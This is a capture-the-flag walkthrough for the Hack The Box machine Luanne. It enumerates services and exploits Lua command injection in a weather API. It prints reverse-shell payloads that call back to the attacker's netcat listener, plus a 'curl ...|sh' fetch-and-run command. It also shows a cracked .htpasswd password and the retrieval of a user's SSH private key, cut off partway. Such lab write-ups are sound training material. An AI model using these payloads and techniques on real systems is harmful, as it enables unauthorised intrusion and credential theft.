---
description: 10.10.10.218
---

# Luanne

![](<../../.gitbook/assets/1 (6) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Lua command injection to get shell as "\_httpd". Crack hash found in .htaccess file. Using curl, connect to local service on port 3001 with creds to find SSH private key. SSH as "r.michaels".
* Root - Decrypt backup file with netpgp, then crack another hash in .htaccess. Use password to escalate to root using "doas" command.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.218            
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-22 04:52 EST
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.10.10.218
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 712.67 seconds
```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 22,80,9001 10.10.10.218 -n    
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-22 05:05 EST
Nmap scan report for 10.10.10.218
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-title: Error response
|_http-server-header: Medusa/1.12
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|WAP|storage-misc
Running (JUST GUESSING): NetBSD 5.X|7.X|3.X|2.X (96%), Apple NetBSD 4.X (95%), Apple embedded (93%), QNX RTOS 6.X (91%)
OS CPE: cpe:/o:netbsd:netbsd:5.1.2 cpe:/o:apple:netbsd cpe:/o:netbsd:netbsd:7.99 cpe:/o:netbsd:netbsd:3.1.1 cpe:/h:apple:airport_extreme cpe:/o:apple:netbsd:4.99 cpe:/o:qnx:rtos:6.5.0 cpe:/o:netbsd:netbsd:2.1.0_stable
Aggressive OS guesses: NetBSD 5.1.2 (96%), NetBSD 5.0 - 5.99.5 (95%), Apple AirPort Extreme WAP (version 7.7.3) or NetBSD 7.99 (95%), Apple AirPort Extreme WAP (version 7.7.3) (93%), NetBSD 7.0 (93%), NetBSD 3.1.1 (92%), Apple AirPort Extreme WAP (NetBSD 4.99) (91%), Apple AirPort Extreme WAP or Time Capsule NAS device (NetBSD 4.99), or QNX RTOS 6.5.0 (91%), NetBSD 2.1.0_STABLE or Ricoh C720S, 1107EX, MP 2550, or MP 7001 printer (91%), QNX RTOS 7.0.0 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   15.01 ms 10.10.14.1
2   15.23 ms 10.10.10.218

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.28 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.218                                                                             130 ⨯
http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]                                                        
                                                             
└─$ whatweb http://10.10.10.218:9001 
http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
                                                          
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.218 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.218
+ Target Hostname:    10.10.10.218
+ Target Port:        80
+ Start Time:         2021-11-22 05:14:34 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.19.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm '.'
+ "robots.txt" contains 1 entry which should be manually viewed.
+ 26623 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-11-22 05:24:03 (GMT-5) (569 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Dirb

Let's run a dirb scan against the target.

```
└─$ dirb http://10.10.10.218/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Nov 22 05:01:47 2021
URL_BASE: http://10.10.10.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.218/ ----
+ http://10.10.10.218/index.html (CODE:200|SIZE:612)                                                             
+ http://10.10.10.218/robots.txt (CODE:200|SIZE:78)                                                              
                                                                                                                 
-----------------
END_TIME: Mon Nov 22 05:02:59 2021
DOWNLOADED: 4612 - FOUND: 2

```

We find a robots.txt, which contains a "Disallow" entry for /weather. Let's rerun the scan with /weather. We get nothing back with the default wordlist.&#x20;

Let's try a bigger list with ffuf.

### Ffuf

​ Let's run a ffuf scan against the /weather route:

```
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/FUZZ -ic -t 100 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.218/weather/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

forecast                [Status: 200, Size: 90, Words: 12, Lines: 2]
:: Progress: [220547/220547] :: Job [1/1] :: 4389 req/sec :: Duration: [0:00:55] :: Errors: 0 ::

```

We find another route, /weather/forecast.

## Website exploration

#### ​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* Both websites (port 80 and 9001) require authentication
* Port 80 has robots.txt, which has an entry for /weather

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Sites require authentication so nothing found initially

#### ​Browsing

Visiting both websites (port 80 and 9001) presents us with an authentication popup, with no indication of what the sites are. However, looking at the nmap output, we can see that the site on port 80 is running "nginx 1.19.0" and the site on port 9001 is running "Medusa httpd 1.12 (Supervisor process manager)".

A google search for "supervisord default creds" finds the following page:

{% embed url="http://supervisord.org/configuration.html#unix-http-server-section-example" %}

The default creds are- user:123, and if we try these, we get in:

![](<../../.gitbook/assets/9 (1).JPG>)

There is some information here about running processes which may be useful later on. Let it refresh a couple of times as we see more processes:

```
/python3.8 /usr/pkg/bin/supervisord-3.8 
root        348  0.0  0.0  71344  2896 ?     Is    9:09AM 0:00.00 /usr/sbin/sshd 
_httpd      376  0.0  0.0  34952  2008 ?     Ss    9:09AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
root        402  0.0  0.0  20220  1656 ?     Is    9:09AM 0:00.02 /usr/sbin/cron 
_httpd     5469  0.0  0.0  17892  1528 ?     S    11:15AM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
root        421  0.0  0.0  22348  1592 ttyE1 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root        388  0.0  0.0  21776  1588 ttyE2 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root        433  0.0  0.0  19780  1584 ttyE3 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE3 


USER        PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
root          0  0.0  0.2      0 11896 ?     DKl   9:09AM 0:01.41 [system]
root          1  0.0  0.0  19848  1520 ?     Is    9:09AM 0:00.01 init 
root        163  0.0  0.0  33724  2288 ?     Ss    9:09AM 0:00.02 /usr/sbin/syslogd -s 
r.michaels  185  0.0  0.0  34996  1960 ?     Is    9:09AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
nginx       271  0.0  0.1  34112  3448 ?     I     9:09AM 0:00.17 nginx: worker process 
root        298  0.0  0.0  23468  1336 ?     Is    9:09AM 0:00.00 /usr/sbin/powerd 
root        299  0.0  0.0  33372  1848 ?     Is    9:09AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
_httpd      336  0.0  0.3 121400 16132 ?     Ss    9:09AM 0:02.64 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root        348  0.0  0.0  71344  2896 ?     Is    9:09AM 0:00.00 /usr/sbin/sshd 
_httpd      376  0.0  0.0  34952  2008 ?     Is    9:09AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
root        402  0.0  0.0  20220  1656 ?     Ss    9:09AM 0:00.02 /usr/sbin/cron 
_httpd     4949  0.0  0.0      0     0 ?     R          - 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ (sh)
root        421  0.0  0.0  22348  1592 ttyE1 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root        388  0.0  0.0  21776  1588 ttyE2 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root        433  0.0  0.0  19780  1584 ttyE3 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE3 
```

For now, let's make a note of these and move on.

We also found the /weather/forecast route on the port 80 website, so let's check that out:

![](<../../.gitbook/assets/2 (5) (1) (1).JPG>)

Using the information from the page above, let's try [http://10.10.10.218/weather/forecast?city=list](http://10.10.10.218/weather/forecast?city=list)

![](<../../.gitbook/assets/3 (3) (1).JPG>)

We get a list of cities. If we enter any of the listed cities, we get a weather forecast for that city in JSON format.&#x20;

![](<../../.gitbook/assets/4 (1).JPG>)

If we enter nothing, we get an error message:

![](<../../.gitbook/assets/5 (3) (1).JPG>)

If we enter a special character suck as a single qoute, we get an interesting response:

![](<../../.gitbook/assets/6 (3) (1).JPG>)

The target is using the Lua langauge on the backend.

A google search for "lua injection" finds the following article:

{% embed url="https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities" %}

According to the article, if the developer allows unsanitized user input to be passed to either the os.execute() or io.popen() Lua functions, then an attacker will have remote code execution on the target system. Using this information, along with some trial and error, we manage to get RCEwith the following payload:

[http://10.10.10.218/weather/forecast?city=London');os.execute("id")--](http://10.10.10.218/weather/forecast?city=London%27\);os.execute\(%22id%22\)--)

![](<../../.gitbook/assets/7 (2) (1) (1).JPG>)

## Gaining Access Method 1 - Browser

Let's start a netcat listener. The payload we'll use is as follows:

> city=London');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 8585 >/tmp/f")--

After sending the above payload, we get back an error. If we look at the payload in BURP, we can see that the browser is encoding it as follows:

> city=London%27);os.execute(%22rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&1|nc%2010.10.14.6%208585%20%3E/tmp/f%22)--

{% hint style="info" %}
NOTE: The browser we are using is Firefox, and so the encoding may differ depending on your browser.
{% endhint %}

Instead of letting the browser do the encoding on it's own, let's encode the payload first using Cyberchef. We'll select the "URL Encode" option, and enable the "Encode all special chars" check box.

{% embed url="https://gchq.github.io/CyberChef" %}

![](<../../.gitbook/assets/8 (2).JPG>)

Let's copy and paste the output from Cyberchef and append it to the URL as follows:

> [http://10.10.10.218/weather/forecast?city=London%27%29%3Bos%2Eexecute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E6%208585%20%3E%2Ftmp%2Ff%22%29%2D%2D](http://10.10.10.218/weather/forecast?city=London%27%29%3Bos%2Eexecute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E6%208585%20%3E%2Ftmp%2Ff%22%29%2D%2D)

Copy and paste the URL into a browser and hit enter. In our netcat shell, we receive a connection from the target:

```
└─$ nc -nvlp 8585                                                                                           130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8585
Ncat: Listening on 0.0.0.0:8585
Ncat: Connection from 10.10.10.218.
Ncat: Connection from 10.10.10.218:65180.
sh: can't access tty; job control turned off
$ id
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
$ 
```

When we try and upgrade our shell by first checking for an installed version of python3, we get an error message stating that our PATH environment variable is not set. We can fix it by setting one as follows:

```
$ which python3
which: PATH environment variable is not set
$ cat /.cshrc | grep "set path"
set path=(/sbin /usr/sbin /bin /usr/bin /usr/pkg/sbin /usr/pkg/bin /usr/X11R7/bin /usr/local/sbin /usr/local/bin)
$ which python
$ which python3
$

```

Unfortunately there is no python installed on the system, so let's move on.

## Gaining Access Method 2 - Curl

Instead of using the browser and URL encoding everything, we could also use "curl" to fetch a reverse shell script and run it.

First, create a script as follows:

```
└─$ cat shell.sh                                                                                              2 ⚙
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 8585 >/tmp/f

```

Next, start a python web server in the directory with the shell script, and start a netcat listener:

```
└─$ python3 -m http.server                                                                                    2 ⚙
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

```
└─$ nc -nvlp 8585        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8585
Ncat: Listening on 0.0.0.0:8585

```

Finally, run the following command:

```
└─$ curl "http://10.10.10.218/weather/forecast?city=London');os.execute('curl+10.10.14.3:8000/shell.sh|sh')--"
```

We see that the shell script is downloaded from our python web server:

```
└─$ python3 -m http.server                                                                                    2 ⚙
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.218 - - [24/Nov/2021 06:06:37] "GET /shell.sh HTTP/1.1" 200 -

```

And in our listener, we get a shell:

```
└─$ nc -nvlp 8585        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8585
Ncat: Listening on 0.0.0.0:8585
Ncat: Connection from 10.10.10.218.
Ncat: Connection from 10.10.10.218:64347.
sh: can't access tty; job control turned off
$ id
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
$ 
```

## Enumeration as "\_httpd"

Let's gather some basic system information:

```
$ uname -a
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
$ netstat -ant | grep LISTEN
tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
tcp        0      0  *.80                   *.*                    LISTEN
tcp        0      0  *.22                   *.*                    LISTEN
tcp        0      0  *.9001                 *.*                    LISTEN
tcp6       0      0  *.22                   *.*                    LISTEN
$ ls -la /home
total 12
drwxr-xr-x   3 root        wheel  512 Sep 14  2020 .
drwxr-xr-x  21 root        wheel  512 Sep 16  2020 ..
dr-xr-x---   7 r.michaels  users  512 Sep 16  2020 r.michaels
$ 
```

There are two additional services running locally on ports 3000 and 3001. Let's have a look at the running processes to see what is running on these ports:

```
$ ps auxw
USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
root           0  0.0  0.2      0 11936 ?     OKl   9:56AM 0:05.39 [system]
root           1  0.0  0.0  19852  1528 ?     Is    9:56AM 0:00.01 init 
root         163  0.0  0.0  32528  2288 ?     Ss    9:56AM 0:00.07 /usr/sbin/syslogd -s 
r.michaels   185  0.0  0.0  34992  2012 ?     Is    9:57AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /hom
root         298  0.0  0.0  19704  1324 ?     Is    9:56AM 0:00.00 /usr/sbin/powerd 
root         299  0.0  0.0  33372  1828 ?     Is    9:57AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
root         318  0.0  0.1 117948  7224 ?     Il    9:56AM 0:15.27 /usr/pkg/bin/vmtoolsd 
_httpd       336  0.0  0.3 119300 16116 ?     Ss    9:57AM 0:13.14 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root         348  0.0  0.0  75116  2908 ?     Is    9:57AM 0:00.01 /usr/sbin/sshd 
nginx        373  0.0  0.1  33896  3504 ?     I     9:57AM 0:35.99 nginx: worker process 
_httpd       376  0.0  0.0  34956  2012 ?     Is    9:57AM 0:04.07 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
root         402  0.0  0.0  24128  1668 ?     Is    9:57AM 0:00.06 /usr/sbin/cron 
_httpd       411  0.0  0.0  23232  1656 ?     I     9:57AM 0:00.27 /bin/sh /usr/local/scripts/processes.sh 
_httpd       422  0.0  0.0  22788  1652 ?     I     9:57AM 0:00.10 /bin/sh /usr/local/scripts/memory.sh 
_httpd       436  0.0  0.0  19992  1656 ?     I     9:57AM 0:00.10 /bin/sh /usr/local/scripts/uptime.sh 
_httpd     21351  0.0  0.0  20028  1716 ?     I     2:28PM 0:00.00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.1
_httpd     22142  0.0  0.0  15952  1392 ?     I     2:45PM 0:00.01 nc 10.10.14.6 8585 
_httpd     22206  0.0  0.0  15436  1280 ?     I     2:45PM 0:00.00 cat /tmp/f 
_httpd     22884  0.0  0.0  35256  2340 ?     I     3:10PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     22885  0.0  0.0  22168  1760 ?     S     3:29PM 0:00.01 /bin/sh -i 
_httpd     22943  0.0  0.0  35256  2340 ?     I     2:28PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     23064  0.0  0.0  35256  2340 ?     I     2:45PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     23294  0.0  0.0  17828  1660 ?     D     3:27PM 0:00.01 find / -perm -4000 
_httpd     23409  0.0  0.0  15952  1396 ?     I     3:10PM 0:00.01 nc 10.10.14.6 8585 
_httpd     23440  0.0  0.0  20708  1712 ?     I     3:10PM 0:00.00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.1
_httpd     23557  0.0  0.0  17636  1384 ?     I     3:50PM 0:00.00 sleep 30 
_httpd     23562  0.0  0.0  20076  1768 ?     I     3:10PM 0:00.01 /bin/sh -i 
_httpd     23769  0.0  0.0  15436  1280 ?     I     3:10PM 0:00.00 cat /tmp/f 
_httpd     23858  0.0  0.0  15440  1284 ?     S     3:29PM 0:00.00 cat /tmp/f 
_httpd     25033  0.0  0.0  16560  1284 ?     I     2:28PM 0:00.00 cat /tmp/f 
_httpd     25448  0.0  0.0  20028  1712 ?     I     2:45PM 0:00.00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.1
_httpd     25615  0.0  0.0  25608  1820 ?     I     3:09PM 0:00.00 /bin/csh 
_httpd     25794  0.0  0.0  20056  1768 ?     I     2:28PM 0:00.00 /bin/sh -i 
_httpd     26062  0.0  0.0  15952  1396 ?     I     2:28PM 0:00.00 nc 10.10.14.6 8585 
_httpd     26156  0.0  0.1  22052  3604 ?     I     2:42PM 0:00.03 grep -r PATH . 
_httpd     26338  0.0  0.0  20140  1760 ?     I     2:45PM 0:00.01 /bin/sh -i 
_httpd     26697  0.0  0.0  15952  1408 ?     S     3:29PM 0:00.01 nc 10.10.14.6 8585 
_httpd     27405  0.0  0.0  35256  2340 ?     I     3:29PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     27852  0.0  0.0  17636  1388 ?     I     3:50PM 0:00.00 sleep 30 
_httpd     27894  0.0  0.0  22620  1524 ?     O     3:50PM 0:00.00 ps -auxw 
_httpd     28398  0.0  0.0  20032  1716 ?     I     3:29PM 0:00.00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.1
_httpd     28438  0.0  0.0  17636  1380 ?     I     3:50PM 0:00.00 sleep 30 
root         423  0.0  0.0  19780  1576 ttyE0 Is+   9:57AM 0:00.00 /usr/libexec/getty Pc constty 
root         421  0.0  0.0  19780  1584 ttyE1 Is+   9:57AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root         388  0.0  0.0  19784  1588 ttyE2 Is+   9:57AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root         433  0.0  0.0  21008  1584 ttyE3 Is+   9:57AM 0:00.00 /usr/libexec/getty Pc ttyE3 
$ 

```

The only process running as the "r.michaels" user is the one listening locally on port 3001. We try and access this service using curl, however, we get an "Unauthorized" error message back.

```
$ curl -i 127.0.0.1:3001
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   199  100   199    0     0  99500      0 --:--:-- --:--:-- --:--:-- 99500
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="."
Content-Type: text/html
Content-Length: 199
Server: bozohttpd/20190228
Allow: GET, HEAD, POST

<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
/: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>
$ 
```

Let's check the directory we landed in, which is the webroot:

```
$ pwd
/var/www
$ ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
$ cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
$ 
```

There is what could be some useful creds or perhaps password reuse within the .htaccess file. We can check what kind of hash it is and then try and crack it with hashcat:

```
└─$ hash-identifier       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0

Possible Hashs:
[+] MD5(Unix)
--------------------------------------------------
 HASH: ^C

        Bye!

└─$ hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt                                           255 ⨯
hashcat (v6.1.1) starting...
...
$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
...

```

We now have the following creds:

> webapi\_user:iamthebest

Perhaps we can use these creds to authenticate to the service running on port 3001. Let's try it with curl:

```
$ which curl
/usr/pkg/bin/curl
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
    <hr>
  </body>
</html>
$ 
```

Let's have another look at the process  being run by "r.michaels". This time, we'll use the "-ww" option which specifies that "ps" should use as many columns as necessary for the output:

```
$ ps -aux -ww | grep "r.michaels"
r.michaels   185  0.0  0.0  34992  2012 ?     Is    9:57AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
_httpd     28718  0.0  0.0  20080     4 ?     R     4:04PM 0:00.00 grep r.michaels (sh)
$ 
```

From the output above, we can see that the command being run is as follows:

> /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd\_devel.pid -U r.michaels -b /home/r.michaels/devel/www

This means that when we access the service on port 3001 locally, after authenticating, we are accessing files inside "r.michaels" home directory, which we otherwise would not have access to, as shown below:

```
$ cat /home/r.michaels/devel/webapi/weather.lua
cat: /home/r.michaels/devel/webapi/weather.lua: Permission denied
$ 
```

Let's see what we can find:

> curl --user webapi\_user:iamthebest http://127.0.0.1:3001/home/r.michaels/

```
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/home/r.michaels/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   230  100   230    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
<html><head><title>404 Not Found</title></head>
<body><h1>404 Not Found</h1>
home/r.michaels/index.html: <pre>This item has not been found</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>
$
```

By default, curl is looking for an index file. After some more trial and error, we issue the following command with some interesting output:

> curl --user webapi\_user:iamthebest http://127.0.0.1:3001/\~r.michaels/

```
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   601    0   601    0     0   195k      0 --:--:-- --:--:-- --:--:--  293k
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>

$ 
```

There appears to be an "id\_rsa" file. Let's see if we can grab it as follows:

> curl --user webapi\_user:iamthebest http://127.0.0.1:3001/\~r.michaels/id\_rsa

```
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   849k      0 --:--:-- --:--:-- --:--:-- 1274k
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
